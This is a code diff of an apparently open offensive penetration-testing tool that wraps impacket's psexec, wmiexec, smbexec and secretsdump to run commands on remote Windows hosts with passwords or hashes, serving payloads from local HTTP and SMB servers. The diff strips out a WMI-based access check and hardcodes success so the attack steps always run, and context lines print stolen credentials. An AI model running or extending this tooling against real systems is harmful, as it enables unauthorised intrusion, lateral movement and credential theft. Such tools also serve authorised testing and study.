@@ -3,53 +3,7 @@
 This pre-section contains the code from the impacket libraries and examples.
 This code falls under the licenses perscribed by that code distribution.
 '''
-try:
-    from impacket import smbserver, version
-    from impacket import version, ntlm
-    from impacket.dcerpc.v5 import transport, dcomrt
-    from impacket.dcerpc.v5.dtypes import NULL as null_operator
-    from impacket.dcerpc.v5.dcom import wmi
-    from impacket.dcerpc.v5.dcomrt import DCOMConnection
-    from impacket.examples import logger
-    import cmd
-except Exception as e:
-    print("[!] The following error occured %s") % (e)
-    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
-
-class WMIQUERY(cmd.Cmd):
-    def __init__(self, iWbemServices):
-        cmd.Cmd.__init__(self)
-        self.iWbemServices = iWbemServices
-        self.record = ""
-
-    def printReply(self, iEnum):
-        printHeader = True
-        while True:
-            try:
-                pEnum = iEnum.Next(0xffffffff,1)[0]
-                self.record = pEnum.getProperties()
-                printHeader = False
-            except Exception, e:
-                if str(e).find('S_FALSE') < 0:
-                    raise
-                else:
-                    break
-        iEnum.RemRelease()
-
-    def default(self, line):
-        line = line.strip('\n')
-        if line[-1:] == ';':
-            line = line[:-1]
-        try:
-            iEnumWbemClassObject = self.iWbemServices.ExecQuery(line.strip('\n'))
-            self.printReply(iEnumWbemClassObject)
-            iEnumWbemClassObject.RemRelease()
-        except Exception, e:
-            logging.error(str(e))
-
-    def return_data(self):
-        return(self.record)
-
+#Insert Impacket Code as Necessary
 '''
 Author: Christopher Duffy
 Date: July 2015
@@ -91,10 +45,6 @@ try:
     import netaddr
 except:
     sys.exit("[!] Install the netaddr library: pip install netaddr")
-#try:
-#    import wmi_client_wrapper as wmi
-#except:
-#    sys.exit("[!] Install the wmi_client_wrapper library: pip install wmi_client_wrapper && apt-get install wmi-client")
 try:
     import psexec, smbexec, atexec, netview, wmiexec, secretsdump
     from impacket import smbserver, version
@@ -370,7 +320,6 @@ def delivery_server(port, working_dir, delivery_method, share_name):
 def http_server(port, working_dir):
     null = open('/dev/null', 'w')
     sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
-    time.sleep(1)
     #Test Server
     test_request = "http://127.0.0.1:%s" % (port)
     try:
@@ -389,47 +338,6 @@ def smb_server(working_dir, share_name):
     smb_srv.setLogFile('')
     sub_proc = subprocess.Popen([smb_srv.start()])
     return sub_proc
-
-def wmi_test(usr, pwd, dom, dst, hash, aes, kerberos):
-    if hash:
-        LM, NTLM = hash.split(":")
-    else:
-        LM = ''
-        NTLM  = ''
-    namespace = '//./root/cimv2'
-    wmi_init = None
-    wmi_shell = None
-    output = False
-    try:
-        with Timeout(3):
-           connection = DCOMConnection(dst, usr, pwd, dom, LM, NTLM, aes, oxidResolver = True, doKerberos = kerberos)
-           wmi_init = connection.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
-           wmi_login = wmi.IWbemLevel1Login(wmi_init)
-           wmi_services = wmi_login.NTLMLogin(namespace, null_operator, null_operator)
-           wmi_login.RemRelease()
-           wmi_shell = WMIQUERY(wmi_services)
-           wmi_shell.onecmd("SELECT * FROM Win32_Processor")
-           wmi_services.RemRelease()
-           wmi_init.disconnect()
-    except Exception, e:
-        #logging.error(str(e))
-        if e == None:
-            e = "Time exceeded"
-        print("[!] An error occurred while querying the WMI service: %s") % (e)
-        if wmi_init:
-            try:
-                wmi_services.RemRelease()
-                wmi_init.disconnect()
-            except:
-                pass
-    try:
-        if wmi_shell.return_data:
-            output = True
-        else:
-            output = False
-    except Exception, e:
-        output = False
-    return(output)
 
 def main():
     # If script is executed at the CLI
@@ -599,9 +507,9 @@ Create Pasteable Double Encoded Script:
         payload = os.path.basename(payload)
         payload = ''.join(payload)
     elif delivery == "web":
-        cwd = "/opt/ranger/web"
+        cwd = "/opt/ranger/web/"
     elif delivery == "smb":
-        cwd = "/opt/ranger/smb"
+        cwd = "/opt/ranger/smb/"
         src_port = 445
 
     if aes != None:
@@ -797,7 +705,8 @@ Create Pasteable Double Encoded Script:
                     print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
                 if command == "cmd.exe":
                     sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
-                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                test = True
                 if test:
                     with Timeout(3):
                         try:
@@ -809,8 +718,13 @@ Create Pasteable Double Encoded Script:
                             if srv:
                                 srv.terminate()
                                 print("[*] Shutting down the catapult %s server") % (str(delivery))
+                                #os.kill(os.getpid(), 9)
+                                pass
+                else:
+                    print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             if attacks and not encoder:
-                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                test = True
                 if test:
                     with Timeout(3):
                         try:
@@ -822,10 +736,13 @@ Create Pasteable Double Encoded Script:
                             if srv:
                                 srv.terminate()
                                 print("[*] Shutting down the catapult %s server") % (str(delivery))
+                                #os.kill(os.getpid(), 9)
+                                pass
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             else:
-                test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
+                test = True
                 if test:
                     with Timeout(3):
                         try:
@@ -837,6 +754,8 @@ Create Pasteable Double Encoded Script:
                             if srv:
                                 srv.terminate()
                                 print("[*] Shutting down the catapult %s server") % (str(delivery))
+                                #os.kill(os.getpid(), 9)
+                                pass
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
     elif netview_cmd:
